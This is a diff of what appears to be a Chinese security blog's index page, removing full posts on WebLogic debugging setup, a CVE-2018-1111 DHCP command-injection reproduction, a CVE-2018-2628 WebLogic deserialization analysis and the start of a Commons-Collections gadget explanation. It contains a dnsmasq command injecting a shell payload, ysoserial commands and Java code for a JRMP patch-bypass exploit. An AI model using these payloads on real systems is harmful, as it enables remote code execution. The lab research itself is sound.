@@ -303,43 +303,15 @@
       
         
           
-            <h3 id="背景简介"><a href="#背景简介" class="headerlink" title="背景简介"></a>背景简介</h3><p>​    WebLogic 是美国Oracle公司出品的一个 application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic 是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将   Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
-<p>​    近年来，Java 反序列化爆发，WebLogic 作为一个 Java 应用服务器也深受反序列漏洞的影响。就目前在外有详情和漏洞利用程序的 WebLogic 反序列化漏洞就有不少，CVE-2015-4852，CVE-2016-0638，CVE-2016-3510，CVE-2017-3248，CVE-2018-2628等。本文记录的就是一个搭建 WebLogic 动态调试环境的过程，方便调试 WebLogic 相关漏洞。</p>
-<h3 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h3><ul>
-<li>IntelliJ IDEA</li>
-<li>WebLogic 10.3.6.0</li>
-<li>一个可以部署在 WebLogic 上的 web 应用，我用的是jolokia-1.0.0。</li>
-</ul>
-<h3 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h3><ol>
-<li><p>WebLogic 去 Oracle 官网下载，我下载的是WebLogic 10.3.6.0，点击安装即可。</p>
-</li>
-<li><p>Web 应用使用的是jolokia-1.0.0，选个能在 WebLogic 上部署的 web 应用就行，要注意的是 jdk 版本问题，我下载的 WebLogic 10.3.6.0 ，它自带的 jdk 版本很低，是1.6.029，可以说非常古老了。所以选择的 web 应用要保证在 jdk 1.6.029 上运行。</p>
-</li>
-<li>将 web 项目导入到 IntelliJ IDEA 里面。</li>
-</ol>
-<img src="/2018/05/20/WebLogic-动态调试环境搭建/import_project.png">
-<h3 id="配置-WebLogic"><a href="#配置-WebLogic" class="headerlink" title="配置 WebLogic"></a>配置 WebLogic</h3><h4 id="设置-web-项目-JDK"><a href="#设置-web-项目-JDK" class="headerlink" title="设置 web 项目 JDK"></a>设置 web 项目 JDK</h4><p>​    点击 idea 的 <code>Project Structure</code>，新建一个 jdk，web 项目要使用 WebLogic 自带的jdk，因为调试反序列化漏洞的时候会跟到 jdk 里面的相关函数，所以这里一定要使用 WebLogic 的jdk，这个非常非常重要。</p>
-<img src="/2018/05/20/WebLogic-动态调试环境搭建/set_jdk.png">
-<h4 id="新建-Weblgoic"><a href="#新建-Weblgoic" class="headerlink" title="新建 Weblgoic"></a>新建 Weblgoic</h4><p>​    点击 idea 的<code>Edit Configurations</code>，添加一个本地的 WebLogic。</p>
-<img src="/2018/05/20/WebLogic-动态调试环境搭建/add_weblogic.png">
-<h4 id="配置-WebLogic-服务器"><a href="#配置-WebLogic-服务器" class="headerlink" title="配置 WebLogic 服务器"></a>配置 WebLogic 服务器</h4><p>​    新建一个本地 WebLogic 之后，WebLogic server的名字可以自己随意填，要在<code>Application server</code>中配置一个 WebLogic 服务器，也就是将本地安装的 WebLogic 和idea 连通起来。<code>WebLogic Home</code>添加的是 WebLogic 的安装目录。</p>
-<img src="/2018/05/20/WebLogic-动态调试环境搭建/configure_weblogic.png">
-<p>​    配置好之后，下面的<code>Domain Path</code>就会自动识别了，这里要填的就是 WebLogic 的管理员的账号密码了，因为要部署 web 应用。</p>
-<img src="/2018/05/20/WebLogic-动态调试环境搭建/auth.png">
-<p>​    最后在设置一下下<code>Deployment</code>，添加一个<code>Artifacts</code></p>
-<img src="/2018/05/20/WebLogic-动态调试环境搭建/add_artifacts.png">
-<p>​    添加完之后就ok了，可以跑起来了。</p>
-<img src="/2018/05/20/WebLogic-动态调试环境搭建/run.png">
-<h3 id="调试-WebLogic"><a href="#调试-WebLogic" class="headerlink" title="调试 WebLogic"></a>调试 WebLogic</h3><p>​    经过上面的步骤，已经可以成功的在 idea 上运行 WebLogic了，接下来的调试也很简单，想调试哪个包，在web 项目的 <code>Libraries</code> 上添加进去，然后下断点就行了。</p>
-<p>​    WebLogic 大多数包都是在<code>Middleware\modules</code>，所以我把整个文件夹添加到 web 项目的<code>Libraries</code>。</p>
-<img src="/2018/05/20/WebLogic-动态调试环境搭建/add_modules.png">
-<p>​    添加完成后，此时就可以在 idea 的 <code>External Libtaries</code> 中看到我们添加的包。</p>
-<img src="/2018/05/20/WebLogic-动态调试环境搭建/modules.png">
-<p>​    例如，WebLogic 的反序列漏洞大多是通过t3协议来发送 payload，数据流会经过<code>InboundMsgAbbrev</code>这个类，我们就可以在<code>D:\Oracle\Middleware\modules\com.bea.core.WebLogic.rmi.client_1.11.0.0.jar!\WebLogic\rjvm\InboundMsgAbbrev.class</code>上下断点，然后debug启动，用脚本发送payload，可以看到，成功的debug到了。</p>
-<img src="/2018/05/20/WebLogic-动态调试环境搭建/debug.png">
-<p>​    有一些漏洞触发点在其他的包里面，可以找到位置添加到<code>Libraries</code>里，在里面下断点就可以 debug 了。</p>
-
-          
+          背景简介​WebLogic 是美国Oracle公司出品的一个 application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic 是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将   Java 的动态功能和 Java En
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/05/20/WebLogic-动态调试环境搭建/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -457,46 +429,15 @@
       
         
           
-            <h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>2018年5月15日，Red Hat官方发布通告称修复了一个DHCP Client相关的漏洞（CVE-2018-1111）。当系统使用NetworkManager并配置了DHCP协议时，攻击者可以利用一个恶意的DHCP服务器或者本地网络构造的DHCP响应，在该系统上以root权限执行任意命令。</p>
-<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul>
-<li>Red Hat Enterprise Linux Server 6</li>
-<li>Red Hat Enterprise Linux Server 7</li>
-<li>CentOS 6</li>
-<li>CentOS 7</li>
-<li>Fedora</li>
-</ul>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><ul>
-<li>Red Hat Enterprise Linux Server 6.0</li>
-<li>Kali 2.0 dnsmasq</li>
-</ul>
-<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ol>
-<li><p>关闭DHCP</p>
-<p>攻击机器和目标机器须在同一个局域网内，为了不受其他DHCP服务器影响，VMware的网卡需要关闭DHCP功能。让攻击机器充当恶意服务器来给目标机器分配IP，下发配置。</p>
-<img src="/2018/05/19/Red-Hat-DHCP客户端命令执行漏洞-CVE-2018-1111-复现与简析/close_dhcp.png">
-<p>​</p>
-</li>
-<li><p>设置攻击机器IP</p>
-<p>攻击机器充当恶意DHCP服务器，需要设置一个静态IP。</p>
-<img src="/2018/05/19/Red-Hat-DHCP客户端命令执行漏洞-CVE-2018-1111-复现与简析/set_ip.png">
-</li>
-<li><p>启动恶意DHCP服务器</p>
-<p>   在攻击机器上使用 dnsmasq 启动一个DHCP服务，分配IP从 192.168.177.100~192.168.177.200，时效一个小时，将 payload 放置了dhcp_option 中，分配IP给客户端同时把 payload 的也发送过去，客户端在接收到的时候并没有进行过滤，从而触发漏洞。(我这使用的是<code>--dhcp-option=&quot;67</code>，并没有使用作者给出的252，我本地的 dnsmasq 并没有 252选项，可使用<code>dnsmasq --help dhcp</code> 查看，所以使用的选项67 – <code>bootfile-name</code>)</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsmasq --interface=eth0 --bind-interfaces  --except-interface=lo --dhcp-range=192.168.177.100,192.168.177.200,1h --conf-file=/dev/null --dhcp-option=6,192.168.177.2 --dhcp-option=3,192.168.177.2 --dhcp-option="67,x'&amp;touch /tmp/pwn #"</span><br></pre></td></tr></table></figure>
-<img src="/2018/05/19/Red-Hat-DHCP客户端命令执行漏洞-CVE-2018-1111-复现与简析/start_dhcp.png">
-</li>
-<li><p>启动Red Hat Server</p>
-<p>   启动目标机器后，会自动响应DHCP服务器的广播，从而分配 IP。这里的局域网内只有我们设置的一个恶意 DHCP 服务器，所以会由恶意 DHCP 服务器分配IP，并执行配置中携带的 payload。(如果之前有分配的IP，重启网卡重新分配，<code>/etc/init.d/network restart</code>)</p>
-   <img src="/2018/05/19/Red-Hat-DHCP客户端命令执行漏洞-CVE-2018-1111-复现与简析/result.png">
-<p>   从上图看到，目标机器成功的分配到了我们设置的IP，并且执行了命令 <code>touch /tmp/pwn</code></p>
-</li>
-</ol>
-<h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p>DHCP 是一个局域网的网络协议，主要用于内部网络动态IP地址分配。</p>
-<p>Red Hat提供的DHCP客户端软件包 dhclient 的脚本为<code>/etc/NetworkManager/dispatcher.d/11-dhclient</code>（Red Hat Enterprise Linux 7）和<code>/etc/NetworkManager/dispatcher.d/10-dhclient</code>（Red Hat Enterprise Linux 6）；当 NetworkManager 组件从DHCP服务器收到DHCP响应时执行该脚本。</p>
-<img src="/2018/05/19/Red-Hat-DHCP客户端命令执行漏洞-CVE-2018-1111-复现与简析/10_dhclient.png">
-<p>使用单引号使参数值逃逸成功，导致了命令执行</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--dhcp-option="67,x'&amp;touch /tmp/pwn #"</span><br></pre></td></tr></table></figure>
-
-          
+          漏洞简介2018年5月15日，Red Hat官方发布通告称修复了一个DHCP Client相关的漏洞（CVE-2018-1111）。当系统使用NetworkManager并配置了DHCP协议时，攻击者可以利用一个恶意的DHCP服务器或者本地网络构造的DHCP响应，在该系统上以root权限执行任意命令
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/05/19/Red-Hat-DHCP客户端命令执行漏洞-CVE-2018-1111-复现与简析/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -614,66 +555,15 @@
       
         
           
-            <h4 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>​   2018年4月18日，Oracle官方发布了4月份的安全补丁更新CPU（Critical Patch Update），更新中修复了一个高危的 WebLogic 反序列化漏洞CVE-2018-2628。攻击者可以在未授权的情况下通过T3协议对存在漏洞的 WebLogic 组件进行远程攻击，并可获取目标系统所有权限。</p>
-<h4 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h4><ul>
-<li>Weblogic 10.3.6.0</li>
-<li>Weblogic 12.1.3.0</li>
-<li>Weblogic 12.2.1.2</li>
-<li>Weblogic 12.2.1.3</li>
-</ul>
-<h4 id="Weblogic-反序列漏洞历程"><a href="#Weblogic-反序列漏洞历程" class="headerlink" title="Weblogic 反序列漏洞历程"></a>Weblogic 反序列漏洞历程</h4><p>这里简单的说下几个有公开利用方式的反序列漏洞。</p>
-<h5 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h5><p>2015年11月6日，FoxGlove Security 安全团队的 @breenmachine 发布的一篇博客中介绍了如何利用Java反序列化和 Apache Commons Collections 这一基础类库来攻击最新版的 WebLogic、WebSphere、JBoss、Jenkins、OpenNMS 这些大名鼎鼎的Java应用，实现远程代码执行。CVE-2015-4852就是利用 Weblogic 中的Commons Collections 库来实现远程代码执行。查看了CVE-2015-4852的补丁（p21984589_1036_Generic），发现 Weblogic 采用的黑名单的形式来修复这个漏洞。</p>
-<img src="/2018/04/24/Weblogic-反序列漏洞-CVE-2018-2628-漫谈/blacklist.png">
-<p>但是这种修复方式很被动，存在被绕过的风险，只要发现可用并且未在黑名单之外的反序列化类，那么之前的防护就会被打破，系统遭受攻击。而后的漏洞也证明了这一点。</p>
-<h5 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h5><p>Weblogic的反序列化的点有着三个,黑名单<code>ClassFilter.class</code>也作用于这三个位置。</p>
-<ul>
-<li><code>weblogic.rjvm.InboundMsgAbbrev.class::ServerChannelInputStream</code></li>
-<li><code>weblogic.rjvm.MsgAbbrevInputStream.class</code></li>
-<li><code>weblogic.iiop.Utils.class</code></li>
-</ul>
-<p>有人发现利用<code>weblogic.jms.common.StreamMessageImpl</code>的 <code>readExternal()</code>也是可以进行反序列化操作的，而且这个不受黑名单限制，所以可以绕过了之前的补丁。</p>
-<h5 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h5><p>​   原理是将反序列化的对象封装进了<code>weblogic.corba.utils.MarshalledObject</code>，然后再对 <code>MarshalledObject</code>进行序列化，生成 payload 字节码。反序列化时 <code>MarshalledObject</code> 不在 WebLogic 黑名单里，可正常反序列化，在反序列化时 <code>MarshalledObject</code>对象调用 <code>readObject</code> 时对 <code>MarshalledObject</code> 封装的序列化对象再次反序列化，这样就逃过了黑名单的检查。</p>
-<h5 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h5><p>​   Java远程消息交换协议 JRMP 即 Java Remote MessagingProtocol ，是特定于 Java 技术的、用于查找和引用远程对象的协议。这是运行在 Java 远程方法调用 RMI 之下、TCP/IP 之上的线路层协议。</p>
-<p>​   这个漏洞就是利用 RMI 机制的缺陷，通过 JRMP 协议达到执行任意反序列化 payload 的目的。使用 ysoserial  的 <code>JRMPLister</code>，这将会序列化一个 <code>RemoteObjectInvocationHandler</code>，该<code>RemoteObjectInvocationHandler</code>使用<code>UnicastRef</code>建立到远端的 TCP 连接获取<code>RMI registry</code>。 此连接使用 JRMP 协议，因此客户端将反序列化服务器响应的任何内容，从而实现未经身份验证的远程代码执行。</p>
-<h4 id="CVE-2018-2628-漏洞分析"><a href="#CVE-2018-2628-漏洞分析" class="headerlink" title="CVE-2018-2628 漏洞分析"></a>CVE-2018-2628 漏洞分析</h4><p>​   首先我们来看以下 CVE-2017-3248 这个漏洞的补丁（p24667634_1036_Generic），在<code>weblogic.rjvm.InboundMsgAbbrev$ServerChannelInputStream.class</code>多了一个<code>resolveProxyClass</code>，这个<code>resolveProxyClass</code>只是对 RMI 接口类型进行了判断，判断 RMI 接口是否为<code>java.rmi.registry.Registry</code>，是的话抛出错误。</p>
-<img src="/2018/04/24/Weblogic-反序列漏洞-CVE-2018-2628-漫谈/resolveproxyclass.png">
-<p>这里，换个RMI 接口类型即可绕过这个补丁。可以使用<code>java.rmi.activation.Activator</code>来替代<code>java.rmi.registry.Registry</code>生成payload，即可绕过这个判断限制。</p>
-<p>仿照<code>JRMPClient</code>写一个<code>JRMPClient2</code>，重新编译。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JRMPClient2</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Activator</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Activator <span class="title">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="keyword">int</span> port;</span><br><span class="line">        <span class="keyword">int</span> sep = command.indexOf(<span class="string">':'</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> Random().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">        Activator proxy = (Activator) Proxy.newProxyInstance(JRMPClient2.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">            Activator.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient2.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient2.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>生成 payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient2 &quot;192.168.177.1:1099&quot; &gt; p_client2</span><br></pre></td></tr></table></figure>
-<p>可以对比以下<code>JRMPClient</code> 和<code>JRMPClient2</code> 生成的 payload。</p>
-<img src="/2018/04/24/Weblogic-反序列漏洞-CVE-2018-2628-漫谈/compared.png">
-<p>除了 RMI 接口不一样，其他都是一样的。</p>
-<p><code>JRMPLister</code>开启</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure>
-<p>我测试的 Weblogic 版本是<code>10.3.6.0.170117</code>，即已修复了CVE-2017-3248漏洞，在我本地的环境中，<code>CommonsCollections</code>这个 payload 已经失效了。Weblogic 的<code>commons-collections.jar</code>版本已经升级，所以我这里 payload 用的是<code>Jdk7u21</code>（这个 payload 只有在 JRE 版本小于等于 1.7u21 才起作用）。在<code>commons-collections.jar</code>版本没有升级的 Weblogic 中，使用<code>CommonsCollections</code> 这个 payload 是可以的。</p>
-<p>使用 t3 协议脚本发送 p_client2，可以看到<code>JRMPLister</code>有请求过来了，客户端命令也执行成功了。</p>
-<img src="/2018/04/24/Weblogic-反序列漏洞-CVE-2018-2628-漫谈/p_client2_lister.png">
-<img src="/2018/04/24/Weblogic-反序列漏洞-CVE-2018-2628-漫谈/p_client2_result.png">
-<p>作为对比，将<code>JRMPClient</code>生成的 p_client 也发送过去，可以看到报错信息<code>Unauthorized proxy deserialization</code>，正是黑名单拦截抛出的错误。</p>
-<img src="/2018/04/24/Weblogic-反序列漏洞-CVE-2018-2628-漫谈/p_client1_result.png">
-<p>可见<code>java.rmi.activation.Activator</code>是绕过了CVE-2017-3248的补丁了。</p>
-<h5 id="另外一种绕过补丁的方式"><a href="#另外一种绕过补丁的方式" class="headerlink" title="另外一种绕过补丁的方式"></a>另外一种绕过补丁的方式</h5><p>这种方式是我在复现漏洞时尝试 payload 的时候发现的，绕过的方式和CVE-2016-0638有关。</p>
-<p><code>StreamMessageImpl</code>这个点在反序列化的时候没有<code>resolveProxyClass</code>检查。所以可以使用<code>StreamMessageImpl</code>将<code>RemoteObjectInvocationHandler</code>序列化，以此来绕过<code>resolveProxyClass</code>函数。相当于使用CVE-2016-0638的利用方式加上CVE-2017-3248的 payload 来绕过补丁。</p>
-<p>将<code>JRMPClient</code>生成的 payloadObject 用<code>StreamMessageImpl</code>封装生成新的 payload——p_stream。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">streamMessageImpl</span><span class="params">(<span class="keyword">byte</span>[] object)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamMessageImpl streamMessage = <span class="keyword">new</span> StreamMessageImpl();</span><br><span class="line">    streamMessage.setDataBuffer(object, object.length);</span><br><span class="line">    <span class="keyword">return</span> streamMessage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<img src="/2018/04/24/Weblogic-反序列漏洞-CVE-2018-2628-漫谈/p_stream.png">
-<p>使用脚本发送，可以看到，成功执行了命令。</p>
-<img src="/2018/04/24/Weblogic-反序列漏洞-CVE-2018-2628-漫谈/p_stream_result.png">
-<h4 id="CVE-2018-2628补丁分析"><a href="#CVE-2018-2628补丁分析" class="headerlink" title="CVE-2018-2628补丁分析"></a>CVE-2018-2628补丁分析</h4><p>初步比对补丁(p27395085_1036_Generic)，发现<code>WeblogicFilterConfig.class</code>的黑名单多了一个<code>sun.rmi.server.UnicastRef</code>。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_CLASSES = <span class="keyword">new</span> String[]&#123;<span class="string">"org.codehaus.groovy.runtime.ConvertedClosure"</span>, <span class="string">"org.codehaus.groovy.runtime.ConversionHandler"</span>, <span class="string">"org.codehaus.groovy.runtime.MethodClosure"</span>, <span class="string">"org.springframework.transaction.support.AbstractPlatformTransactionManager"</span>, <span class="string">"sun.rmi.server.UnicastRef"</span>&#125;;</span><br></pre></td></tr></table></figure>
-<p>但是根据我的实际测试，命令还是可以执行成功，貌似补丁没起作用。</p>
-<img src="/2018/04/24/Weblogic-反序列漏洞-CVE-2018-2628-漫谈/test_patch.png">
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>​   总的来说，Weblogic 反序列漏洞就是在不停的修复-绕过-修复-绕过……最精彩的永远是下一个！</p>
-<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><ul>
-<li><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a></li>
-<li><a href="http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">CVE-2018-2628 简单复现与分析</a></li>
-<li><a href="https://paper.seebug.org/333/" target="_blank" rel="noopener">WebLogic反序列化漏洞重现江湖，CVE-2017-3248成功绕过之前的官方修复</a></li>
-<li><a href="http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html" target="_blank" rel="noopener">Oracle Critical Patch Update Advisory - April 2018</a></li>
-</ul>
-
-          
+          漏洞简介​   2018年4月18日，Oracle官方发布了4月份的安全补丁更新CPU（Critical Patch Update），更新中修复了一个高危的 WebLogic 反序列化漏洞CVE-2018-2628。攻击者可以在未授权的情况下通过T3协议对存在漏洞的 WebLogic 组件进行远程攻
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/24/Weblogic-反序列漏洞-CVE-2018-2628-漫谈/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -791,73 +681,15 @@
       
         
           
-            <h3 id="Apache-Commons-Collections-简介"><a href="#Apache-Commons-Collections-简介" class="headerlink" title="Apache Commons-Collections 简介"></a>Apache Commons-Collections 简介</h3><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p>
-<p>一些Java应用程序(Weblogic，Websphere，Jboss，Jenkins，Coldfusion等)的RCE漏洞都是因为Commons-Collections的反序列化造成的。</p>
-<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache Commons Collections 中提供 了一个Transformer的类，这个接口的功能就是将一个对象转换为另外一个对象。</p>
-<p>首先关注一下几个重要的类：</p>
-<ul>
-<li><code>invokeTransformer</code><ul>
-<li>Transformer implementation that creates a new object instance by reflection.（通过反射，返回一个对象）</li>
-</ul>
-</li>
-<li><code>ChainedTransformer</code><ul>
-<li>Transformer implementation that chains the specified transformers together.（把transformer连接成一条链，对一个对象依次通过链条内的每一个transformer进行转换）</li>
-</ul>
-</li>
-<li><code>ConstantTransformer</code><ul>
-<li>Transformer implementation that returns the same constant each time.（把一个对象转化为常量，并返回）</li>
-</ul>
-</li>
-</ul>
-<p>首先来看看<code>invokeTransformer</code>类和<code>transform</code>方法</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以看到该该方法中采用了反射的方法进行函数调用，Input参数为要进行反射的对象(反射机制就是可以把一个类,类的成员(函数,属性),当成一个对象来操作,也就是说,类,类的成员,我们在运行的时候还可以动态地去操作他们)，<code>iMethodName</code>，<code>iParamTypes</code>为调用的方法名称以及该方法的参数类型，<code>iArgs</code>为对应方法的参数，在<code>invokeTransformer</code>这个类的构造函数中我们可以发现，这三个参数均为可控参数。这里我们需要传入三个参数：方法名，参数类型，参数值。这样就可以调用对象中的任意函数了</p>
